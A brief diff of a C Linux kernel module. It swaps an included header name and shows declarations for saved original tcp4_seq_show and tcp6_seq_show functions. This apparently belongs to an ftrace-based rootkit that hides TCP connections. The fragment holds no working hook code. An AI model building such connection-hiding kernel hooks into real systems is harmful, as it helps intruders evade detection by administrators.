@@ -5,7 +5,7 @@
 #include <linux/syscalls.h>
 #include <linux/kallsyms.h>
 
-#include "ftrace_helper.h"
+#include "ftrace_hook.h"
 
 static asmlinkage int (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
 static asmlinkage int (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);
